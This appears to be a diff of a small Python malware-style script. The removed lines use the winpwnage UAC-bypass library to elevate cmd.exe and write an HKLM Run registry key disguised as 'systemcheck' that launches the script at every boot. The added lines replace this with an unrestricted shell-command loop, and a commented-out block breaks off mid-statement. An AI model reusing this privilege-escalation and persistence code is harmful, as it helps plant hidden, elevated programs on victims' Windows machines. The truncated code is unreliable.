@@ -1,13 +1,15 @@
-from winpwnage.functions.elevate.elevateMethod1 import elevateMethod1
-import sys
+# import os
 
-if getattr(sys, 'frozen', False):
-	file_path = sys.executable
-	type_of = "exe"
-elif __file__:
-	file_path = __file__
-	type_of = "py"
+# while True:
+# 	_cmd = input('cmd> ')
+# 	cmd = _cmd.split(' ')[0]
+# 	args = _cmd.split(' ')[1] if len(_cmd.split(' ')) > 2 else None
+# 	if cmd == 'cd':
+# 		os.chdir(args)
+# 	if cmd == 'dir':
+# 		os.
 
-# elevateMethod1(['C:\\Windows\\system32\\cmd.exe', '/c', f'cp {file_path} c:\\windows\\system32'])
-elevateMethod1(['C:\\Windows\\system32\\cmd.exe', '/c', f'reg add "HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run" /f /v systemcheck /t REG_SZ /d {file_path}'])
-#  reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /f /v systemcheck /t REG_SZ /d test
+import subprocess
+while True:
+	cmd = input('> ')
+	subprocess.call(cmd, shell=True)
